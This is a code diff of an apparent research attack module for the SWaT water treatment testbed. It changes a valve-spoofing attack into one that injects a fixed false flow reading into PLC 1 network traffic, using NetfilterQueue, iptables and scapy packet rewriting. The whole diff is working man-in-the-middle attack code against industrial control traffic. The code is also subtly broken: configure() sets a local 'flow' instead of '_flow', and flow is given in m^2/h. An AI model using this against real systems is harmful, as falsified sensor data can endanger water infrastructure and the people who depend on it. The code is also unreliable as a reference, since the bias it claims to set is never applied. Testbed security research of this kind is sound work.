@@ -1,6 +1,6 @@
 #!/usr/bin/env python2
 # -*- coding: utf-8 -*-
-# Copyright (c) 2015 David I. Urbina, UTD
+# Copyright (c) 2015 David I. Urbina, david.urbina@utdallas.edu
 #
 # Permission is hereby granted, free of charge, to any person obtaining a copy
 # of this software and associated documentation files (the "Software"), to deal
@@ -20,36 +20,30 @@
 # OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 # THE SOFTWARE.
 """Secure Water Testbed (SWaT) Singapore University of Technology and Design.
-SWATAttack module to spoof the valve in PLC 1.
+SWATAttack module to inject a constant bias in the water flow in PLC 1.
 """
 from __future__ import print_function
-from netfilterqueue import NetfilterQueue
+
 import os
+from netfilterqueue import NetfilterQueue
 
 from scapy.layers.inet import IP
 from scapy.layers.inet import UDP
 
+import scaling
 import swat
 
-
 # Parameters list
-valve = False  # True is open, False is close
+_flow = 0
+sflow = 0
 
 
 def __spoof(packet):
     pkt = IP(packet.get_payload())
-    if swat.SWAT_P1_RIO_DI in pkt:
-        pkt[swat.SWAT_P1_RIO_DI].valve_close = 0 if valve else 1
-        pkt[swat.SWAT_P1_RIO_DI].valve_open = 1 if valve else 0
+    if swat.SWAT_P1_RIO_AI in pkt:
+        pkt[swat.SWAT_P1_RIO_AI].flow = _flow
         del pkt[UDP].chksum  # Need to recompute checksum
         packet.set_payload(str(pkt))
-
-    if swat.SWAT_P1_RIO_DO in pkt:
-        if pkt[swat.SWAT_P1_RIO_DO].number == 1:  # To avoid Multicast with same length
-            pkt[swat.SWAT_P1_RIO_DO].valve_close = 1 if valve else 0
-            pkt[swat.SWAT_P1_RIO_DO].valve_open = 0 if valve else 1
-            del pkt[UDP].chksum  # Need to recompute checksum
-            packet.set_payload(str(pkt))
 
     packet.accept()
 
@@ -59,25 +53,23 @@ def start():
     nfqueue = NetfilterQueue()
     nfqueue.bind(0, __spoof)
     try:
-        print("[*] starting valve spoofing")
+        print("[*] starting water flow spoofing")
         nfqueue.run()
     except KeyboardInterrupt:
         __setdown()
-        print("[*] stopping valve spoofing")
+        print("[*] stopping water flow spoofing")
         nfqueue.unbind()
 
 
 def configure():
-    global valve
-    valve = input('Set valve state Open(1) or Close(0):')
-    valve = True if valve else False
+    global sflow, _flow
+    sflow = input('Set level (m^2/h): ')
+    flow = scaling.signal_to_current(sflow, scaling.P1Flow)
     params()
 
 
 def params():
-    state = 'Open' if valve else 'Close'
-    value = 1 if valve else 0
-    print('Valve : {} ({})'.format(state, value))
+    print('Flow: {} m^2/h ({})'.format(sflow, _flow))
 
 
 def __setup():
@@ -85,4 +77,4 @@ def __setup():
 
 
 def __setdown():
-    os.system('sudo iptables -t mangle -F')
+    os.system('sudo iptables -t mangle -D PREROUTING -p udp --dport 2222 -j NFQUEUE')
